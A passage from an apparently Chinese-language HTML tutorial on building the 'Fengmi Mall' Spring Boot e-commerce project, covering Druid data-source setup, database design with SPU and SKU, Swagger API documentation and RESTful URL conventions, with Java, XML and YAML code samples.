<span class="token punctuation">{</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> userDAO<span class="token punctuation">.</span><span class="token function">queryUserByName</span><span class="token punctuation">(</span><span class="token string">"Lucy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-6-整合Druid"><a href="#3-6-整合Druid" class="headerlink" title="3.6 整合Druid"></a>3.6 整合Druid</h4><h6 id="3-6-1-添加依赖"><a href="#3-6-1-添加依赖" class="headerlink" title="3.6.1 添加依赖"></a>3.6.1 添加依赖</h6><ul><li><p>在<strong>mapper子工程</strong>添加druid-starter</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--druid starter--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>druid-spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.1.22<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="3-6-2-修改数据源配置"><a href="#3-6-2-修改数据源配置" class="headerlink" title="3.6.2 修改数据源配置"></a>3.6.2 修改数据源配置</h6><ul><li><p>修改<strong>mapper子工程</strong>application.yml文件</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">druid</span><span class="token punctuation">:</span>      <span class="token key atrule">driver-class-name</span><span class="token punctuation">:</span> com.mysql.jdbc.Driver      <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/db_2010_mybatis<span class="token punctuation">?</span>characterEncoding=utf<span class="token punctuation">-</span><span class="token number">8</span>      <span class="token key atrule">username</span><span class="token punctuation">:</span> root      <span class="token key atrule">password</span><span class="token punctuation">:</span> admin123<span class="token key atrule">mybatis</span><span class="token punctuation">:</span>  <span class="token key atrule">mapper-locations</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>mappers/<span class="token important">*Mapper.xml</span>  <span class="token key atrule">type-aliases-package</span><span class="token punctuation">:</span> com.qfedu.fmmall.entity<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="四、《锋迷商城》数据库设计"><a href="#四、《锋迷商城》数据库设计" class="headerlink" title="四、《锋迷商城》数据库设计"></a>四、《锋迷商城》数据库设计</h2><h4 id="4-1-软件开发步骤"><a href="#4-1-软件开发步骤" class="headerlink" title="4.1 软件开发步骤"></a>4.1 软件开发步骤</h4><ul><li><p>问题定义/提出问题 </p></li><li><p>可行性分析（技术、成本、法律法规）</p></li><li><p>需求分析（需求采集、需求分析）—-&gt;甲方</p></li><li><p>概要设计</p><ul><li>架构设计（技术选型、架构模式、项目搭建）</li><li>数据库设计</li><li>UI设计</li><li>业务流程设计</li></ul></li><li><p>详细设计</p><ul><li>实现步骤（业务流程的实现细节）</li></ul></li><li><p>编码</p><ul><li>根据设计好的实现步骤进行代码实现</li><li>开发过程中开发者要进行单元测试</li></ul></li><li><p>测试</p><ul><li>集成测试</li><li>功能测试（黑盒）</li><li>性能测试（白盒）</li></ul></li><li><p>交付/部署实施</p></li></ul><h4 id="4-2-数据库设计流程"><a href="#4-2-数据库设计流程" class="headerlink" title="4.2 数据库设计流程"></a>4.2 数据库设计流程</h4><ul><li>根据项目功能分析数据实体（数据实体，就是应用系统中要存储的数据对象）<ul><li>商品、订单、购物车、用户、评价、地址…</li></ul></li><li>提取数据实体的数据项（数据对象的属性）<ul><li>商品(商品id、商品名称、商品描述，特征）</li><li>地址(姓名、地址、电话…)</li></ul></li><li>使用数据库设计三范式检查数据项是否合理</li><li>分析实体关系：E-R图</li><li>数据库建模（三线图）、建模工具</li><li>建库建表-SQL</li></ul><h4 id="4-3-数据库设计分析"><a href="#4-3-数据库设计分析" class="headerlink" title="4.3 数据库设计分析"></a>4.3 数据库设计分析</h4><h6 id="4-3-1-PDMan建模工具使用"><a href="#4-3-1-PDMan建模工具使用" class="headerlink" title="4.3.1 PDMan建模工具使用"></a>4.3.1 PDMan建模工具使用</h6><ul><li><p>可视化创建数据表（数据表）</p></li><li><p>视图显示数据表之间的关系（关系图）</p></li><li><p>导出SQL指令（模型–导出DDL脚本）</p></li><li><p>记录数据设计的版本-数据库模型版本的管理（模型版本）</p></li><li><p>同步数据模型到数据库（开始-数据库连接）</p><p><img src="imgs/1618382547448.png" alt="1618382547448"></p></li></ul><h6 id="4-3-2-分析《锋迷商城》的数据库模型"><a href="#4-3-2-分析《锋迷商城》的数据库模型" class="headerlink" title="4.3.2 分析《锋迷商城》的数据库模型"></a>4.3.2 分析《锋迷商城》的数据库模型</h6><ul><li><p>用户</p></li><li><p>首页</p></li><li><p>商品</p></li><li><p>购物车</p></li><li><p>订单 和 订单项</p></li><li><p>评论</p></li></ul><h4 id="4-4-SPU-和-SKU"><a href="#4-4-SPU-和-SKU" class="headerlink" title="4.4 SPU 和 SKU"></a>4.4 SPU 和 SKU</h4><h6 id="4-4-1-SPU"><a href="#4-4-1-SPU" class="headerlink" title="4.4.1 SPU"></a>4.4.1 SPU</h6><blockquote><p>SPU(Standard Product Unit)：标准化产品单元。是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息的集合，该集合描述了一个产品的特性。通俗点讲，属性值、特性相同的商品就可以称为一个SPU。</p></blockquote><p>1    荣耀8   </p><p>2    小米10</p><h6 id="4-4-2-SKU"><a href="#4-4-2-SKU" class="headerlink" title="4.4.2 SKU"></a>4.4.2 SKU</h6><blockquote><p><a href="https://baike.baidu.com/item/SKU/5016808">SKU</a>（中文译为<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E5%AD%98%E8%B4%A7%E5%8D%95%E4%BD%8D/892217">最小存货单位</a>，英文全称为Stock Keeping Unit,简称SKU，定义为保存库存控制的最小可用单位)</p></blockquote><p>101      8G / 128G    10     1800     1</p><p>102      4G / 128G    20     1500     1</p><p>103      8G / 128G    12     2999     2</p><p>104      12G / 256G   11     3999     2</p><h4 id="4-5-建库建表"><a href="#4-5-建库建表" class="headerlink" title="4.5 建库建表"></a>4.5 建库建表</h4><h6 id="4-5-1-创建数据表"><a href="#4-5-1-创建数据表" class="headerlink" title="4.5.1 创建数据表"></a>4.5.1 创建数据表</h6><ul><li>从PDMan导出sql，导入到mysql</li></ul><h6 id="4-5-2-准备测试数据"><a href="#4-5-2-准备测试数据" class="headerlink" title="4.5.2 准备测试数据"></a>4.5.2 准备测试数据</h6><ul><li><p>首页轮播图 index_img</p><p><img src="imgs/1618392216009.png" alt="1618392216009"></p></li><li><p>首页类别信息  category</p><p><img src="imgs/1618392552921.png" alt="1618392552921"></p></li><li><p>商品信息</p></li><li><p>sku</p></li></ul><h2 id="五、《锋迷商城》业务流程设计-接口规范"><a href="#五、《锋迷商城》业务流程设计-接口规范" class="headerlink" title="五、《锋迷商城》业务流程设计-接口规范"></a>五、《锋迷商城》业务流程设计-接口规范</h2><blockquote><p>在企业项目开发中，当完成项目的需求分析、功能分析、数据库分析与设计之后，项目组就会按照项目中的功能进行开发任务的分配</p></blockquote><p><img src="imgs/1618450184396.png" alt="1618450184396"></p><h4 id="5-1-前后端分离与单体架构流程实现的区别"><a href="#5-1-前后端分离与单体架构流程实现的区别" class="headerlink" title="5.1 前后端分离与单体架构流程实现的区别"></a>5.1 前后端分离与单体架构流程实现的区别</h4><blockquote><p>单体架构：页面和控制之间可以进行跳转，同步请求控制器，流程控制由的控制来完成</p><p>前后端分离架构：前端和后端分离开发和部署，前端只能通过异步向后端发送请求，后端只负责接收请求及参数、处理请求、返回处理结果，但是后端并不负责流程控制，流程控制是由前端完成</p></blockquote><h6 id="5-1-1-单体架构"><a href="#5-1-1-单体架构" class="headerlink" title="5.1.1 单体架构"></a>5.1.1 单体架构</h6><p><img src="imgs/1618451138871.png" alt="1618451138871"></p><h6 id="5-1-2-前后端分离架构"><a href="#5-1-2-前后端分离架构" class="headerlink" title="5.1.2 前后端分离架构"></a>5.1.2 前后端分离架构</h6><p><img src="imgs/1618451153971.png" alt="1618451153971"></p><h4 id="5-2-接口介绍"><a href="#5-2-接口介绍" class="headerlink" title="5.2 接口介绍"></a>5.2 接口介绍</h4><h6 id="5-2-1-接口概念"><a href="#5-2-1-接口概念" class="headerlink" title="5.2.1 接口概念"></a>5.2.1 接口概念</h6><blockquote><p>狭义的理解：就是控制器中可以接受用户请求的某个方法</p><p>应用程序编程接口，简称API（Application Programming Interface），就是<a href="">软件</a>系统不同<a href="">组成</a>部分衔接的约定</p></blockquote><h6 id="5-2-2-接口规范"><a href="#5-2-2-接口规范" class="headerlink" title="5.2.2 接口规范"></a>5.2.2 接口规范</h6><blockquote><p>作为一个后端开发者，我们不仅要完成接口程序的开发，还要编写接口的说明文档——接口规范</p></blockquote><p><strong>接口规范示例</strong>：</p><p>参考：<a href="%E3%80%8A%E9%94%8B%E8%BF%B7%E5%95%86%E5%9F%8E%E3%80%8B%E5%90%8E%E7%AB%AF%E6%8E%A5%E5%8F%A3%E8%AF%B4%E6%98%8E.docx">《锋迷商城》后端接口说明</a></p><h4 id="5-3-Swagger"><a href="#5-3-Swagger" class="headerlink" title="5.3 Swagger"></a>5.3 Swagger</h4><blockquote><p>前后端分离开发，后端需要编写接口说明文档，会耗费比较多的时间</p><p>swagger是一个用于生成服务器接口的规范性文档、并且能够对接口进行测试的工具</p></blockquote><h6 id="5-3-1-作用"><a href="#5-3-1-作用" class="headerlink" title="5.3.1 作用"></a>5.3.1 作用</h6><ul><li>生成接口说明文档</li><li>对接口进行测试</li></ul><h6 id="5-3-2-Swagger整合"><a href="#5-3-2-Swagger整合" class="headerlink" title="5.3.2  Swagger整合"></a>5.3.2  Swagger整合</h6><ul><li><p>在<strong>api子工程</strong>添加依赖（Swagger2 \ Swagger UI）</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>io.springfox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>springfox-swagger2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.9.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>io.springfox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>springfox-swagger-ui<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.9.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在<strong>api子工程</strong>创建swagger的配置（Java配置方式）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableSwagger2</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SwaggerConfig</span> <span class="token punctuation">{</span>    <span class="token comment">/*swagger会帮助我们生成接口文档    * 1：配置生成的文档信息    * 2: 配置生成规则*/</span>    <span class="token comment">/*Docket封装接口文档信息*/</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">Docket</span> <span class="token function">getDocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//创建封面信息对象</span>        <span class="token class-name">ApiInfoBuilder</span> apiInfoBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApiInfoBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        apiInfoBuilder<span class="token punctuation">.</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">"《锋迷商城》后端接口说明"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">description</span><span class="token punctuation">(</span><span class="token string">"此文档详细说明了锋迷商城项目后端接口规范...."</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">version</span><span class="token punctuation">(</span><span class="token string">"v 2.0.1"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">contact</span><span class="token punctuation">(</span> <span class="token keyword">new</span> <span class="token class-name">Contact</span><span class="token punctuation">(</span><span class="token string">"亮哥"</span><span class="token punctuation">,</span><span class="token string">"www.liangge.com"</span><span class="token punctuation">,</span><span class="token string">"liangge@wang.com"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ApiInfo</span> apiInfo <span class="token operator">=</span>  apiInfoBuilder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Docket</span> docket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Docket</span><span class="token punctuation">(</span><span class="token class-name">DocumentationType</span><span class="token punctuation">.</span>SWAGGER_2<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">apiInfo</span><span class="token punctuation">(</span>apiInfo<span class="token punctuation">)</span> <span class="token comment">//指定生成的文档中的封面信息：文档标题、版本、作者</span>                <span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">apis</span><span class="token punctuation">(</span><span class="token class-name">RequestHandlerSelectors</span><span class="token punctuation">.</span><span class="token function">basePackage</span><span class="token punctuation">(</span><span class="token string">"com.qfedu.fmmall.controller"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token class-name">PathSelectors</span><span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> docket<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>测试：</p><ul><li>启动SpringBoot应用，访问：<a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a></li></ul></li></ul><h6 id="5-3-3-Swagger注解说明"><a href="#5-3-3-Swagger注解说明" class="headerlink" title="5.3.3 Swagger注解说明"></a>5.3.3 Swagger注解说明</h6><blockquote><p>swagger提供了一套注解，可以对每个接口进行详细说明</p></blockquote><p><code>@Api</code> 类注解，在控制器类添加此注解，可以对控制器类进行功能说明</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"提供商品添加、修改、删除及查询的相关接口"</span><span class="token punctuation">,</span>tags <span class="token operator">=</span> <span class="token string">"商品管理"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>@ApiOperation</code>方法注解：说明接口方法的作用</p><p><code>@ApiImplicitParams</code>和<code>@ApiImplicitParam</code> 方法注解，说名接口方法的参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"用户登录接口"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ApiImplicitParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"string"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"username"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户登录账号"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token annotation punctuation">@ApiImplicitParam</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"string"</span><span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"password"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户登录密码"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span>defaultValue <span class="token operator">=</span> <span class="token string">"111111"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/login"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span>                      <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"password"</span><span class="token punctuation">,</span>defaultValue <span class="token operator">=</span> <span class="token string">"111111"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> pwd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> userService<span class="token punctuation">.</span><span class="token function">checkLogin</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>pwd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@ApiModel</code>和<code>@ApiModelProperty</code> 当接口参数和返回值为对象类型时，在实体类中添加注解说明</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@NoArgsConstructor</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token annotation punctuation">@ApiModel</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"User对象"</span><span class="token punctuation">,</span>description <span class="token operator">=</span> <span class="token string">"用户/买家信息"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"int"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> userId<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"String"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户注册账号"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userName<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"String"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户注册密码"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userPwd<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"String"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户真实姓名"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userRealname<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>dataType <span class="token operator">=</span> <span class="token string">"String"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"用户头像url"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userImg<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@ApiIgnore</code>接口方法注解，添加此注解的方法将不会生成到接口文档中</p><h6 id="5-3-4-Swagger-ui-插件"><a href="#5-3-4-Swagger-ui-插件" class="headerlink" title="5.3.4 Swagger-ui 插件"></a>5.3.4 Swagger-ui 插件</h6><ul><li><p>导入插件的依赖</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.github.xiaoymin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>swagger-bootstrap-ui<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.9.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>文档访问</p><p><a href="http://ip:port/doc.html">http://ip:port/doc.html</a></p></li></ul><h4 id="5-4-RESTful"><a href="#5-4-RESTful" class="headerlink" title="5.4 RESTful"></a>5.4 RESTful</h4><blockquote><p>前后端分离开发的项目中，前后端之间是接口进行请求和响应，后端向前端提供请求时就要对外暴露一个URL；URL的设计不能是随意的，需要遵从一定的设计规范——RESTful</p></blockquote><p>RESTful 是一种Web api的标准，也就是一种url设计风格/规范</p><ul><li><p><code>每个URL请求路径代表服务器上的唯一资源</code></p><pre class="line-numbers language-none"><code class="language-none">传统的URL设计：http://localhost:8080/goods/delete?goodsId=1    商品1    http://localhost:8080/goods/delete?goodsId=2    商品2RESTful设计：http://localhost:8080/goods/delete/1    商品1http://localhost:8080/goods/delete/2    商品2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/delete/{gid}"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">deleteGoods</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"gid"</span><span class="token punctuation">)</span> <span class="token keyword">int</span> goodsId<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----"</span><span class="token operator">+</span>goodsId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token string">"delete success"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>使用不同的请求方式表示不同的操作</code></p><blockquote><p>SpringMVC对RESTful风格提供了很好的支持，在我们定义一个接口的URL时，可以通过<code>@RequestMapping(value="/{id}",method=RequestMethod.GET)</code>形式指定请求方式，也可使用特定请求方式的注解设定URL</p><p><code>@PostMapping("/add")</code></p><p><code>@DeleteMapping("/{id}")</code></p><p><code>@PutMapping("/{id}")</code></p><p><code>@GetMapping("/{id}")</code></p></blockquote><ul><li>post   添加</li><li>get     查询</li><li>put     修改</li><li>delete 删除</li><li>option  (预检)</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java">根据ID删除一个商品：<span class="token comment">//http://localhost:8080/goods/1   [delete]</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/{id}"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>DELETE<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">deleteGoods</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token keyword">int</span> goodsId<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----"</span><span class="token operator">+</span>goodsId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token string">"delete success"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>根据ID查询一个商品：<span class="token comment">//http://localhost:8080/goods/1    [get]</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/{id}"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">getGoods</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token keyword">int</span> goodsId<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 